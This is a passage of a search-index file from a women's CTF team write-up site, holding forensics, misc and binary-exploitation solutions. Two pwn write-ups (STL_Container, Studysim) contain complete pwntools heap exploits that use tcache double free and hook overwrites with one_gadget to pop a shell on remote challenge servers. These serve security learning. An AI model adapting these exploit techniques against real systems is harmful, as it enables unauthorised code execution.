{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Welcome to TeamShakti Writeups Introduction This repo is hosted by TeamShakti , the women-only CTF team of Amrita Vishwa Vidyapeetham, Amritapuri Campus . The contents of this repo This repo contains the writeups of varoius challenges from CTFs we have attempted. Reverse Engineering Binary Exploitation Cryptography Web Exploitation Forensic Analysis Miscellaneous","title":"Welcome to TeamShakti Writeups"},{"location":"#welcome-to-teamshakti-writeups","text":"","title":"Welcome to TeamShakti Writeups"},{"location":"#introduction","text":"This repo is hosted by TeamShakti , the women-only CTF team of Amrita Vishwa Vidyapeetham, Amritapuri Campus .","title":"Introduction"},{"location":"#the-contents-of-this-repo","text":"This repo contains the writeups of varoius challenges from CTFs we have attempted. Reverse Engineering Binary Exploitation Cryptography Web Exploitation Forensic Analysis Miscellaneous","title":"The contents of this repo"},{"location":"about/","text":"About Us","title":"About Us"},{"location":"about/#about-us","text":"","title":"About Us"},{"location":"shaktictf/","text":"Welcome to ShaktiCTF Writeups Introduction This repo is hosted by TeamShakti , the women-only CTF team of Amrita Vishwa Vidyapeetham, Amritapuri Campus . The contents of this repo ShaktiCTF 2020 add more stuff - Reverse Engineering - Binary Exploitation","title":"ShaktiCTF"},{"location":"shaktictf/#welcome-to-shaktictf-writeups","text":"","title":"Welcome to ShaktiCTF Writeups"},{"location":"shaktictf/#introduction","text":"This repo is hosted by TeamShakti , the women-only CTF team of Amrita Vishwa Vidyapeetham, Amritapuri Campus .","title":"Introduction"},{"location":"shaktictf/#the-contents-of-this-repo","text":"","title":"The contents of this repo"},{"location":"shaktictf/#shaktictf-2020","text":"add more stuff - Reverse Engineering - Binary Exploitation","title":"ShaktiCTF 2020"},{"location":"ShaktiCTF20/pwning/intro/","text":"Binary Exploitation Table of containing the challenge status Challenge Name Level Author Concept Let's Connect Very Easy b3y0nd3r nc,ls,cat Returning Very Easy rudyerudite return values of snprintf, overflow Compute_Shell Easy b3y0nd3r Shellcode Adventure Chain Easy b3y0nd3r ROPchain, passing args Reactor_GOT Medium b3y0nd3r GOT overwrite","title":"Binary Exploitation"},{"location":"ShaktiCTF20/pwning/intro/#binary-exploitation","text":"Table of containing the challenge status Challenge Name Level Author Concept Let's Connect Very Easy b3y0nd3r nc,ls,cat Returning Very Easy rudyerudite return values of snprintf, overflow Compute_Shell Easy b3y0nd3r Shellcode Adventure Chain Easy b3y0nd3r ROPchain, passing args Reactor_GOT Medium b3y0nd3r GOT overwrite","title":"Binary Exploitation"},{"location":"crypto/intro/","text":"Cryptography Introduction \"Write about Crypto and about the writeups\" The contents of this repo This repo contains the writeups of varoius challenges from CTFs we have attempted.","title":"Cryptography"},{"location":"crypto/intro/#cryptography","text":"","title":"Cryptography"},{"location":"crypto/intro/#introduction","text":"\"Write about Crypto and about the writeups\"","title":"Introduction"},{"location":"crypto/intro/#the-contents-of-this-repo","text":"This repo contains the writeups of varoius challenges from CTFs we have attempted.","title":"The contents of this repo"},{"location":"forensics/intro/","text":"Forensics Introduction \"Write about Forensics and about the writeups\" The contents of this repo This repo contains the writeups of varoius challenges from CTFs we have attempted.","title":"Forensics"},{"location":"forensics/intro/#forensics","text":"","title":"Forensics"},{"location":"forensics/intro/#introduction","text":"\"Write about Forensics and about the writeups\"","title":"Introduction"},{"location":"forensics/intro/#the-contents-of-this-repo","text":"This repo contains the writeups of varoius challenges from CTFs we have attempted.","title":"The contents of this repo"},{"location":"forensics/DarkCTF/Knot-65/Knot/","text":"Knot-65 Description Mr Elliot Anderson has received a zip file from somewhere around. From a secret friend he got a transcript of some conversation. Help Mr. Elliot to get the secret flag. Once you get the password,convert it to lower case as password. Solution So, we are given one password protected zip file and one text file. If you look carefully we can find that some of the characters in the text file are in uppercase. You can either write a python program or manually collect the uppercase letters. And we get IKNOWYARECOLLECTAINGLLUPPERCASELETTERFIRSTPARTOFTHEPASSWORDISLETTHEREBE r = open( file.txt , r ) r = r.read() part1='' for i in r: if i.isupper(): part1+=i print(part1) As mentioned in the description, after converting it to lowercase, we get iknowyarecollectainglluppercaseletterfirstpartofthepasswordislettherebe. And the first part of the flag is lettherebe. We get the second part of the flag by running stegsnow. The second part of the flag is goodrainswithshining. We find some homoglyph unicode characters towards the end of the text file. Collecting those characters we get the last part of the flag rainnnbow. So, the final password is \"lettherebegoodrainswithshiningrainnnbow\". We use this password to open the password protected text file which contains some 8 digit numbers. 31060562 32641524 21475550 14066460 21666171 34073461 35044157 33661564 15046170 23032164 146764 This is octal-xlate encoding. We can decode these characters online from here And the flag is darkCTF{h0m0Glypw1tHooct4LxL4t3}","title":"Knot-65"},{"location":"forensics/DarkCTF/Knot-65/Knot/#knot-65","text":"","title":"Knot-65"},{"location":"forensics/DarkCTF/Knot-65/Knot/#description","text":"Mr Elliot Anderson has received a zip file from somewhere around. From a secret friend he got a transcript of some conversation. Help Mr. Elliot to get the secret flag. Once you get the password,convert it to lower case as password.","title":"Description"},{"location":"forensics/DarkCTF/Knot-65/Knot/#solution","text":"So, we are given one password protected zip file and one text file. If you look carefully we can find that some of the characters in the text file are in uppercase. You can either write a python program or manually collect the uppercase letters. And we get IKNOWYARECOLLECTAINGLLUPPERCASELETTERFIRSTPARTOFTHEPASSWORDISLETTHEREBE r = open( file.txt , r ) r = r.read() part1='' for i in r: if i.isupper(): part1+=i print(part1) As mentioned in the description, after converting it to lowercase, we get iknowyarecollectainglluppercaseletterfirstpartofthepasswordislettherebe. And the first part of the flag is lettherebe. We get the second part of the flag by running stegsnow. The second part of the flag is goodrainswithshining. We find some homoglyph unicode characters towards the end of the text file. Collecting those characters we get the last part of the flag rainnnbow. So, the final password is \"lettherebegoodrainswithshiningrainnnbow\". We use this password to open the password protected text file which contains some 8 digit numbers. 31060562 32641524 21475550 14066460 21666171 34073461 35044157 33661564 15046170 23032164 146764 This is octal-xlate encoding. We can decode these characters online from here And the flag is darkCTF{h0m0Glypw1tHooct4LxL4t3}","title":"Solution"},{"location":"forensics/DarkCTF/Powershell/Powershell/","text":"PowerShell Solved by : Sridevi Description I want to know what is happening in my Windows Powershell. Solution We are given a .mp3 file. When we open the file, we get an error. So, let's use binwalk to extract the embedded files. Since the challenge name is PowerShell, let's see what is there in PowerShell.xml There is a base64 string. Let's see what we get after decoding it. Flag: darkCTF{C0mm4nd_0n_p0w3rsh3ll}","title":"PowerShell"},{"location":"forensics/DarkCTF/Powershell/Powershell/#powershell","text":"Solved by : Sridevi","title":"PowerShell"},{"location":"forensics/DarkCTF/Powershell/Powershell/#description","text":"I want to know what is happening in my Windows Powershell.","title":"Description"},{"location":"forensics/DarkCTF/Powershell/Powershell/#solution","text":"We are given a .mp3 file. When we open the file, we get an error. So, let's use binwalk to extract the embedded files. Since the challenge name is PowerShell, let's see what is there in PowerShell.xml There is a base64 string. Let's see what we get after decoding it. Flag: darkCTF{C0mm4nd_0n_p0w3rsh3ll}","title":"Solution"},{"location":"forensics/TJCTF/Rap God/Rap/","text":"Rap Goad Solved by : Sridevi Description My rapper friend Big Y sent me his latest track but something sounded a little off about it. Help me find out if he was trying to tell me something with it. Submit your answer as tjctf{message} Solution Open the given mp3 file using Sonic Visualiser. Using Spectrogram we see something like this. They are encoded images, but not clear. Let's examine the channel-2 in Spectrogram. Now, the encoded symbols are clear. After surfing through internet I came across this website which decodes similar images as in our case. Let's try decoding using this website. tjctf{quicksonic} We got the flag!","title":"Rap Goad"},{"location":"forensics/TJCTF/Rap God/Rap/#rap-goad","text":"Solved by : Sridevi","title":"Rap Goad"},{"location":"forensics/TJCTF/Rap God/Rap/#description","text":"My rapper friend Big Y sent me his latest track but something sounded a little off about it. Help me find out if he was trying to tell me something with it. Submit your answer as tjctf{message}","title":"Description"},{"location":"forensics/TJCTF/Rap God/Rap/#solution","text":"Open the given mp3 file using Sonic Visualiser. Using Spectrogram we see something like this. They are encoded images, but not clear. Let's examine the channel-2 in Spectrogram. Now, the encoded symbols are clear. After surfing through internet I came across this website which decodes similar images as in our case. Let's try decoding using this website. tjctf{quicksonic} We got the flag!","title":"Solution"},{"location":"misc/intro/","text":"Miscellaneous Introduction The following are the Links to the writeups to the challenges we have solved from CTF's from the Misc category. The contents of this repo This repo contains the writeups of various challenges from CTFs we have attempted. HSCTF7 2020 Emojis - Sandhra Bino","title":"Miscellaneous"},{"location":"misc/intro/#miscellaneous","text":"","title":"Miscellaneous"},{"location":"misc/intro/#introduction","text":"The following are the Links to the writeups to the challenges we have solved from CTF's from the Misc category.","title":"Introduction"},{"location":"misc/intro/#the-contents-of-this-repo","text":"This repo contains the writeups of various challenges from CTFs we have attempted. HSCTF7 2020 Emojis - Sandhra Bino","title":"The contents of this repo"},{"location":"misc/DarkCTF/quick/","text":"Quickfix Description We were given 10000 images which had to be fixed/concatenated together to form one final image of png format even though the given images were with .jpg file extension and showed that it was curropted when you tried to execute it. So basically first we get all the images, and change the header by changing the first 8 bytes and replace it with the first 8 bytes of png files. Then we rename all the files by changing their file extensions and last but not the least we concatenate the images as a 100x100 matrix image using the PIL module in python. Solution Script from __future__ import print_function import os from PIL import Image def write_to(): files = os.listdir('./QuickFix') ims=Image.open('./QuickFix/'+files[0]+'') result = Image.new( RGB , (100*ims.width, 100*ims.height)) for i in range(100): for j in range(100): cur = Image.open('./QuickFix/'+'flag_{}_{}.png'.format(i,j)) result.paste(cur, (i*ims.width,j*ims.height)) result.save(os.path.expanduser('~/image.png')) def header_change(): for i in os.listdir('./QuickFix'): with open('./QuickFix/'+i, rb+ ) as image: f=image.read() b=bytearray(f) #print(b[:14]) b=b.replace(b[:14],b'\\x89PNG\\r\\n\\x1a\\n\\x00\\x00\\x00\\r') #print(b[:14]) image.seek(0) image.write(b) image.truncate() def rename_func(): for i in os.listdir('./QuickFix'): os.rename('./QuickFix/'+i, './QuickFix/'+i[:-4]+'.png') Solution Flag: Flag Image","title":"Quickfix"},{"location":"misc/DarkCTF/quick/#quickfix","text":"","title":"Quickfix"},{"location":"misc/DarkCTF/quick/#description","text":"We were given 10000 images which had to be fixed/concatenated together to form one final image of png format even though the given images were with .jpg file extension and showed that it was curropted when you tried to execute it. So basically first we get all the images, and change the header by changing the first 8 bytes and replace it with the first 8 bytes of png files. Then we rename all the files by changing their file extensions and last but not the least we concatenate the images as a 100x100 matrix image using the PIL module in python.","title":"Description"},{"location":"misc/DarkCTF/quick/#solution-script","text":"from __future__ import print_function import os from PIL import Image def write_to(): files = os.listdir('./QuickFix') ims=Image.open('./QuickFix/'+files[0]+'') result = Image.new( RGB , (100*ims.width, 100*ims.height)) for i in range(100): for j in range(100): cur = Image.open('./QuickFix/'+'flag_{}_{}.png'.format(i,j)) result.paste(cur, (i*ims.width,j*ims.height)) result.save(os.path.expanduser('~/image.png')) def header_change(): for i in os.listdir('./QuickFix'): with open('./QuickFix/'+i, rb+ ) as image: f=image.read() b=bytearray(f) #print(b[:14]) b=b.replace(b[:14],b'\\x89PNG\\r\\n\\x1a\\n\\x00\\x00\\x00\\r') #print(b[:14]) image.seek(0) image.write(b) image.truncate() def rename_func(): for i in os.listdir('./QuickFix'): os.rename('./QuickFix/'+i, './QuickFix/'+i[:-4]+'.png')","title":"Solution Script"},{"location":"misc/DarkCTF/quick/#solution","text":"Flag: Flag Image","title":"Solution"},{"location":"misc/HSCTF7/Emojis/","text":"Emojis - Misc HSCTF2020 Description This challenge was made using emojigram language which is an esolang made using Emojis. All that we need to do is repicate the code in python and generate the flag from it by reversing the code. Replicated Code The replicated code looked like this. But since there are conditional jumps and all that we are given is the output when the flag is given, we have no choice but to guess whether the jumps are taken or not inorder to obttain the desired input. And to achieve the same we played around with a few of the instructions and put together the possibilities to get the Flag. flag=[120, 66, 94, 114, 95, 69, 110, 125, 73, 78, 99, 52, 118] flag[9]=flag[9]+flag[1] flag[7]=flag[7]+flag[11] flag[2]=47 flag[4]=flag[4]+flag[11] flag[0]=flag[0]+flag[2] flag[8]=flag[8]-8 flag[6]=flag[6]+flag[8] flag[6]=flag[6]-flag[8] flag[6]=flag[6]-flag[8] flag[10]=flag[10]+8 flag[11]=flag[11]-1 flag[4]=flag[4]-flag[9] flag[3]=flag[3]-2 flag[2]=flag[2]-4 flag[0]=flag[0]-flag[11] flag[1]=flag[1]-flag[3] flag[1]=flag[1]+flag[3] flag[1]=flag[1]+flag[3] flag[1]=flag[1]-flag[7] flag[3]=flag[12] flag[2]=flag[2]+8 flag[9]=flag[9]-flag[6] flag[2]=flag[2]+flag[4] #flag[1]==flag[5] #False flag[2]=flag[5] #flag[1]==flag[12] #False #flag[11]=flag[11]+flag[0] flag[12]=118 Solution Flag: flag{tr3v0r-pAck3p}","title":"Emojis - Misc HSCTF2020"},{"location":"misc/HSCTF7/Emojis/#emojis-misc-hsctf2020","text":"","title":"Emojis - Misc HSCTF2020"},{"location":"misc/HSCTF7/Emojis/#description","text":"This challenge was made using emojigram language which is an esolang made using Emojis. All that we need to do is repicate the code in python and generate the flag from it by reversing the code.","title":"Description"},{"location":"misc/HSCTF7/Emojis/#replicated-code","text":"The replicated code looked like this. But since there are conditional jumps and all that we are given is the output when the flag is given, we have no choice but to guess whether the jumps are taken or not inorder to obttain the desired input. And to achieve the same we played around with a few of the instructions and put together the possibilities to get the Flag. flag=[120, 66, 94, 114, 95, 69, 110, 125, 73, 78, 99, 52, 118] flag[9]=flag[9]+flag[1] flag[7]=flag[7]+flag[11] flag[2]=47 flag[4]=flag[4]+flag[11] flag[0]=flag[0]+flag[2] flag[8]=flag[8]-8 flag[6]=flag[6]+flag[8] flag[6]=flag[6]-flag[8] flag[6]=flag[6]-flag[8] flag[10]=flag[10]+8 flag[11]=flag[11]-1 flag[4]=flag[4]-flag[9] flag[3]=flag[3]-2 flag[2]=flag[2]-4 flag[0]=flag[0]-flag[11] flag[1]=flag[1]-flag[3] flag[1]=flag[1]+flag[3] flag[1]=flag[1]+flag[3] flag[1]=flag[1]-flag[7] flag[3]=flag[12] flag[2]=flag[2]+8 flag[9]=flag[9]-flag[6] flag[2]=flag[2]+flag[4] #flag[1]==flag[5] #False flag[2]=flag[5] #flag[1]==flag[12] #False #flag[11]=flag[11]+flag[0] flag[12]=118","title":"Replicated Code"},{"location":"misc/HSCTF7/Emojis/#solution","text":"Flag: flag{tr3v0r-pAck3p}","title":"Solution"},{"location":"pwning/intro/","text":"Binary Exploitation Introduction \"Write about Pwn and about the writeups\" The contents of this repo This repo contains the writeups of varoius challenges from CTFs we have attempted. De1CTF20 STL_Container - Shruti Dixit HSCTF20 StudySim - Shruti Dixit VolgaCTF20 Notepad-- - Shruti Dixit N1CTF20 EasyWrite - Shruti Dixit","title":"Binary Exploitation"},{"location":"pwning/intro/#binary-exploitation","text":"","title":"Binary Exploitation"},{"location":"pwning/intro/#introduction","text":"\"Write about Pwn and about the writeups\"","title":"Introduction"},{"location":"pwning/intro/#the-contents-of-this-repo","text":"This repo contains the writeups of varoius challenges from CTFs we have attempted. De1CTF20 STL_Container - Shruti Dixit HSCTF20 StudySim - Shruti Dixit VolgaCTF20 Notepad-- - Shruti Dixit N1CTF20 EasyWrite - Shruti Dixit","title":"The contents of this repo"},{"location":"pwning/De1CTF20/stl/","text":"STL_Container Solved by: Shruti (@rudyerudite) De1CTF had very interesting Pwn and RE challenges but I could only find time to attempt two: STL_Container and Parser of either categories respectively. Here\u2019s a short writeup on a how I solved the former during the CTF. This is a simple challenge for learning and exploiting Tcache. To get the initial click, we run a checksec.sh on the binary and find that all the mitigations are enabled except that RELRO is partial. It\u2019s a 64-bit non-stripped binary which requires libc 2.27. Let\u2019s checkout the typical menu of every heap challenge: STL Container Test 1. list 2. vector 3. queue 4. stack 5. exit 1 1. add 2. delete 3. show 1 input data:aaa done! STL Container Test 1. list 2. vector 3. queue 4. stack 5. exit So CPP program presents us with 3 in built data structures of the most reliable STL library. Stack and queue make use of deque, list makes use of doubly linked list and vector uses a vector. I started out by allocating all the different data structures and found out that one could allocate only 2 nodes in each of the data structures. The allocation of each of these is done on the heap and and makes a fixed allocation of 0x98 bytes for each node. It reads in 0x98 bytes of data. Taking all these into account, there could be a possibility of overwriting free_hook with a one_gadget ( as a shortcut to erstwhile overwriting with system). As the allocation was done using malloc one could get it easily by simply allocating, deleting and printing the contents of the chunk. And we had all the 3 functionalities under our control- though printing was not supported for stack and queue. So I started off by allocating chunks and then deleting them one by one. What I noticed was when deleting vector I got a double free! Which implies there was a chunk pointing to itself in the tcache. That\u2019s why I was able to allocate only 7 chunks. Getting the Leaks I got the heap leaks by simply allocating the chunk which had pointers to the next chunk in the list. After that I called the print functionality. Hmmm\u2026 I\u2019d a heap in the unsorted bin which I\u2019d to allocate and print the contents. But because of the double free and also weird functionality of the code (copy content of a chunk to another and then delete the previous) I was not able to do it so easily. I created a list node and was allocated on the heap. This is how a structure of a node (in list) looked like: 0x5555555455000000: heap_addr_of_next_node heap_addr_of_prev_node 0x5555555455000010: heap_addr_of_the_stored_content I simply allocated one of the freed vector chunks and overwrote the next pointer to the heap address of the stored content. Then on the next allocation the naive tcache gave me the liberty to overwrite the address 0x5555555455000010 with the address of the chunk in the unsorted bin. I did so to make use of the print functionality so that I could simply print out the contents of the list node which I had previously created. But yes the contents printed out weren\u2019t the earlier contents :). That\u2019s how I got the libc leak! Final Exploit I created 2 vectors and deleted them to get a similar double free but this time overwrote next pointer with free_hook with a one_gadget and called a free using delete. Running the code swiftly popped up the much anticipated shell! Here\u2019s the final exploit for the code, mind you it\u2019s not the most optimized code and there could be better ways of solving it. It might be a little confusing to understand, so better get your hands dirty on the binary and try out the exploit yourself! from pwn import * #r = process('./stl_container') r = remote('206.189.186.98',18848) def callds(ds,opt,value,idx): r.sendlineafter( ,str(ds)) r.sendlineafter( ,str(opt)) if(opt == 1): r.sendlineafter( input data: ,value) print(r.recvline()) else: if((ds == 3 or ds == 4) and opt == 2): return r.sendlineafter( index?\\n ,str(idx)) if(ds ==2): print( lol ) print(r.recvline()) #payload = p64(0x0)+p64(0x91)+'a'*(0xa0-0x20)+p64(0x90) #adding chunks to tcache callds(1,1,'a'*0x10,-1) callds(1,1,'b'*0x10,-1) callds(2,1,'c'*0x10,-1) callds(2,1,'d'*0x10,-1) callds(3,1,'e'*0x10,-1) callds(3,1,'f'*0x10,-1) callds(4,1,'g'*0x10,-1) payload = p64(0xa1)*0x6 + p64(0x0) callds(4,1,payload,-1) #deleting chunks; unsorted bin callds(1,2,-1,0) callds(1,2,-1,1) callds(2,2,-1,0) callds(2,2,-1,0) callds(3,2,-1,0) callds(3,2,-1,1) callds(4,2,-1,0) callds(4,2,-1,1) #getting heap leaks callds(1,1,'',-1) callds(1,3,'',1) print(r.recvline()) leak = u64(( \\x70 +r.recvline().strip()).ljust(8,'\\x00')) print(hex(leak)) #getting libc leaks chunk = p64(leak -0x3f0) callds(3,1,'',-1) callds(3,1,chunk,-1) callds(4,1,'/bin/sh',-1) payload = p64(leak+0xa0) callds(4,1,payload,-1) callds(1,3,'',0) leak = u64(r.recvline().strip().split( : )[1].ljust(8,'\\x00')) print(hex(leak)) libc_base = leak - 0x3ebca0 system = libc_base + 0x4f440 malloc_hook = libc_base + 0x3ebc30 free_hook = libc_base + 0x3ed8e8 one_gadget = libc_base + 0x4f322 #final overwrite callds(1,2,-1,0) callds(1,2,-1,0) callds(3,2,-1,0) #to cause a loop callds(2,1,'c'*0x10,-1) callds(2,1,'d'*0x10,-1) callds(2,2,-1,0) callds(2,2,-1,0) payload = p64(free_hook) callds(2,1,payload,-1) callds(3,1,p64(one_gadget),-1) #gdb.attach(r) r.interactive() ##De1CTF{NeuEr_u51ng_O6j3ct_1n_VecT0r}","title":"STL_Container"},{"location":"pwning/De1CTF20/stl/#stl_container","text":"Solved by: Shruti (@rudyerudite) De1CTF had very interesting Pwn and RE challenges but I could only find time to attempt two: STL_Container and Parser of either categories respectively. Here\u2019s a short writeup on a how I solved the former during the CTF. This is a simple challenge for learning and exploiting Tcache. To get the initial click, we run a checksec.sh on the binary and find that all the mitigations are enabled except that RELRO is partial. It\u2019s a 64-bit non-stripped binary which requires libc 2.27. Let\u2019s checkout the typical menu of every heap challenge: STL Container Test 1. list 2. vector 3. queue 4. stack 5. exit 1 1. add 2. delete 3. show 1 input data:aaa done! STL Container Test 1. list 2. vector 3. queue 4. stack 5. exit So CPP program presents us with 3 in built data structures of the most reliable STL library. Stack and queue make use of deque, list makes use of doubly linked list and vector uses a vector. I started out by allocating all the different data structures and found out that one could allocate only 2 nodes in each of the data structures. The allocation of each of these is done on the heap and and makes a fixed allocation of 0x98 bytes for each node. It reads in 0x98 bytes of data. Taking all these into account, there could be a possibility of overwriting free_hook with a one_gadget ( as a shortcut to erstwhile overwriting with system). As the allocation was done using malloc one could get it easily by simply allocating, deleting and printing the contents of the chunk. And we had all the 3 functionalities under our control- though printing was not supported for stack and queue. So I started off by allocating chunks and then deleting them one by one. What I noticed was when deleting vector I got a double free! Which implies there was a chunk pointing to itself in the tcache. That\u2019s why I was able to allocate only 7 chunks.","title":"STL_Container"},{"location":"pwning/De1CTF20/stl/#getting-the-leaks","text":"I got the heap leaks by simply allocating the chunk which had pointers to the next chunk in the list. After that I called the print functionality. Hmmm\u2026 I\u2019d a heap in the unsorted bin which I\u2019d to allocate and print the contents. But because of the double free and also weird functionality of the code (copy content of a chunk to another and then delete the previous) I was not able to do it so easily. I created a list node and was allocated on the heap. This is how a structure of a node (in list) looked like: 0x5555555455000000: heap_addr_of_next_node heap_addr_of_prev_node 0x5555555455000010: heap_addr_of_the_stored_content I simply allocated one of the freed vector chunks and overwrote the next pointer to the heap address of the stored content. Then on the next allocation the naive tcache gave me the liberty to overwrite the address 0x5555555455000010 with the address of the chunk in the unsorted bin. I did so to make use of the print functionality so that I could simply print out the contents of the list node which I had previously created. But yes the contents printed out weren\u2019t the earlier contents :). That\u2019s how I got the libc leak!","title":"Getting the Leaks"},{"location":"pwning/De1CTF20/stl/#final-exploit","text":"I created 2 vectors and deleted them to get a similar double free but this time overwrote next pointer with free_hook with a one_gadget and called a free using delete. Running the code swiftly popped up the much anticipated shell! Here\u2019s the final exploit for the code, mind you it\u2019s not the most optimized code and there could be better ways of solving it. It might be a little confusing to understand, so better get your hands dirty on the binary and try out the exploit yourself! from pwn import * #r = process('./stl_container') r = remote('206.189.186.98',18848) def callds(ds,opt,value,idx): r.sendlineafter( ,str(ds)) r.sendlineafter( ,str(opt)) if(opt == 1): r.sendlineafter( input data: ,value) print(r.recvline()) else: if((ds == 3 or ds == 4) and opt == 2): return r.sendlineafter( index?\\n ,str(idx)) if(ds ==2): print( lol ) print(r.recvline()) #payload = p64(0x0)+p64(0x91)+'a'*(0xa0-0x20)+p64(0x90) #adding chunks to tcache callds(1,1,'a'*0x10,-1) callds(1,1,'b'*0x10,-1) callds(2,1,'c'*0x10,-1) callds(2,1,'d'*0x10,-1) callds(3,1,'e'*0x10,-1) callds(3,1,'f'*0x10,-1) callds(4,1,'g'*0x10,-1) payload = p64(0xa1)*0x6 + p64(0x0) callds(4,1,payload,-1) #deleting chunks; unsorted bin callds(1,2,-1,0) callds(1,2,-1,1) callds(2,2,-1,0) callds(2,2,-1,0) callds(3,2,-1,0) callds(3,2,-1,1) callds(4,2,-1,0) callds(4,2,-1,1) #getting heap leaks callds(1,1,'',-1) callds(1,3,'',1) print(r.recvline()) leak = u64(( \\x70 +r.recvline().strip()).ljust(8,'\\x00')) print(hex(leak)) #getting libc leaks chunk = p64(leak -0x3f0) callds(3,1,'',-1) callds(3,1,chunk,-1) callds(4,1,'/bin/sh',-1) payload = p64(leak+0xa0) callds(4,1,payload,-1) callds(1,3,'',0) leak = u64(r.recvline().strip().split( : )[1].ljust(8,'\\x00')) print(hex(leak)) libc_base = leak - 0x3ebca0 system = libc_base + 0x4f440 malloc_hook = libc_base + 0x3ebc30 free_hook = libc_base + 0x3ed8e8 one_gadget = libc_base + 0x4f322 #final overwrite callds(1,2,-1,0) callds(1,2,-1,0) callds(3,2,-1,0) #to cause a loop callds(2,1,'c'*0x10,-1) callds(2,1,'d'*0x10,-1) callds(2,2,-1,0) callds(2,2,-1,0) payload = p64(free_hook) callds(2,1,payload,-1) callds(3,1,p64(one_gadget),-1) #gdb.attach(r) r.interactive() ##De1CTF{NeuEr_u51ng_O6j3ct_1n_VecT0r}","title":"Final Exploit"},{"location":"pwning/HSCTF20/studysim/","text":"Studysim This was a fun challenge on the vulnerable Tcache bins but different one compared to the simple FD overwrites one would expect. So let\u2019s check it out! Along, with the challenge binary we were provided with Glibc 2.29 and loader for it. You can possibly use patchelf tool if your local environment is not of the one required for the challenge, so that your binary loads the Glibc 2.29 libc and the required loader for it. Carrying out the initial checksec step, we get the following information on the mitigations: Canary : Yes NX : Yes PIE : No Fortify : No RelRO : Full So possibly some overwrite on any of the hooks? A possible FSOP? Let\u2019s explore! The menu function which we are presented with: Welcome to study simulator! Because who has free time when you must STUDY. Commands: add - Adds a worksheet onto your stack of worksheets do - Complete the top worksheets sleep - Give up and sleep Add Let\u2019s us create a new chunk of any size below 0x400 and then the allocated chunk\u2019s address is then stored in an array called stack in .bss section. If the count of the chunks is already 7 then we cannot store anymore chunks but otherwise it simply increments the count variable. stack[allocated_count ++] = address of the allocated chunk After this we can give some content and it prints back the content which we have just added. Do Here comes the vulnerable part. The function asks the user to input any number of integer and reduces the value of allocated_count by that much value without any checks on the input value. Which means using this we can store our return allocated address anywhere on the .bss. This is how the .bss section looks like: 0x404020 stdout@@GLIBC_2.2.5 : 0x00007ffff7fc6760 0x0000000000000000 0x404030 stdin@@GLIBC_2.2.5 : 0x00007ffff7fc5a00 0x0000000000000000 0x404040 allocated_count : 0x0000000000000000 0x0000000000000000 0x404050: 0x0000000000000000 0x0000000000000000 0x404060 stack : 0x0000000000000000 0x0000000000000000 0x404070 stack+16 : 0x0000000000000000 0x0000000000000000 0x404080 stack+32 : 0x0000000000000000 0x0000000000000000 0x404090 stack+48 : 0x0000000000000000 0x0000000000000000 Sleep Well, it just sleeps and exits. Nothing interesting here. Getting the Leaks To get the heap leaks, we can invoke the Do() functionality and then reduce the allocated_count to a negative value such that the address of the heap chunk returned by the malloc function is stored on the allocated_count .bss address. As the binary prints out the value of allocated_count here we get the heap leaks. You throw the worksheet '0@@' on your stack of worksheets. For the libc leaks, well it won\u2019t be that easy as there\u2019s a size check and also no free() to invoke anywhere anyhow. As the libc addresses are stored on the .bss section we need to somehow get an allocation there (as the binary prints the content of the chunk). So now how do we control this? Here, comes the Tcache structure. I found this really good reference for understanding about how the Tcache keeps a track of the number of chunks in Tcache and their addresses. I won\u2019t be explaining it in detail; you can check out the resource mentioned and try checking out the structure in GDB by allocating and freeing chunks in Tcache for any program which allows you to do it. By calculating the right offset with the heap leaks and the known .bss address of the array stack one can get the allocation in the Tcache structure ( using the Do() functionality again ofc). First, we can overwrite the first 8 bytes of tcache_perthread_struct.count. And then similarly on the next allocation we can overwrite the first pointer stored in tcache_perthread_struct.entries (such that it acts as a freed chunk of size of 0x20 bytes). This pointer must have the .bss address of stdout_GLIBC stored as it\u2019s forward pointer. So on the next call on malloc you can get an allocation there and cleverly leak out the libc address stored! 0x1553000: 0x0000000000000000 0x0000000000000251 -- Tcache struct begins 0x1553010: 0x000000000155327f 0x0000000000000000 -- First 8 bytes overwritten with count 0x1553020: 0x0000000000000000 0x0000000000000000 0x1553030: 0x0000000000000000 0x0000000000000000 0x1553040: 0x0000000000000000 0x0000000000000000 0x1553050: 0x0000000000404030 0x0000000000000000 -- Next chunk in line for allocation 0x1553060: 0x0000000000000000 0x0000000000000000 Final Exploit By using the same trick as for the libc leaks, we can trigger the final exploit. Like last time by cleverly getting an allocation on Tcache (probably a chunk of another size, as it might give SIGSEV) of a chunk with FD pointer set to malloc_hook . On the next call to malloc() function we would get an allocation on malloc_hook (exploiting the naive tcache). Now you can simply overwrite it with a one_gadget and on next malloc KABOOM!!! from pwn import * bss_stack = 0x404060 #k = process( ./studysim ,env = { LD_PRELOAD : ./libc.so.6 }) k = remote('pwn.hsctf.com', 5007) def add(size,content): k.sendlineafter( , add ) k.sendlineafter( worksheet?\\n ,str(size)) k.sendlineafter( worksheet?\\n ,content) def do(count): k.sendlineafter( , do ) k.sendlineafter( finish?\\n ,str(count)) def sleep(): k.sendlineafter( , sleep ) stdout_bss = 0x0000000000404030 #heap leaks do(4) add(0x10,'a'*0x10) do(0) k.recvuntil( Only ) heap_leak = int(k.recvline().strip().split( )[0],10)-1 print(hex(heap_leak)) do(heap_leak) #get a count chunk = heap_leak-0x250-0x8 diff = -bss_stack+chunk do(-diff/8) add(0x10,'c'*0x10) do(diff/8+1) #allocate a chunk at .bss addr of stdin chunk = heap_leak-0x208-0x10 diff = -bss_stack+chunk do(-diff/8) add(0x10,p64(stdout_bss)) do(diff/8+1) add(0x08,'') k.sendlineafter( , add ) k.sendlineafter( worksheet?\\n ,str(0x8)) k.sendlineafter( worksheet?\\n ,'a') k.recvuntil( worksheet ) leak = k.recvline().strip().split( )[0].replace( ' , ) leak = '\\x00'+leak[1:] leak = u64(leak.ljust(8,'\\x00')) libc_base = leak-0x1e4a00 print(hex(libc_base)) do(3) #allocate chunk at __malloc_hook malloc_hook = libc_base + 0x0000000001e4c30 system = libc_base + 0x0000000000052fd0 one_gadget = libc_base + 0xe2383 chunk = heap_leak-0x208-0x8 diff = -bss_stack+chunk do(-diff/8) add(0x20,p64(malloc_hook)) do(diff/8+1) add(0x08,'') k.sendlineafter( , add ) k.sendlineafter( worksheet?\\n ,str(0x8)) k.sendlineafter( worksheet?\\n ,p64(one_gadget)) do(2) #call system k.sendlineafter( , add ) k.sendlineafter( worksheet?\\n ,'0') k.interactive()","title":"Studysim"},{"location":"pwning/HSCTF20/studysim/#studysim","text":"This was a fun challenge on the vulnerable Tcache 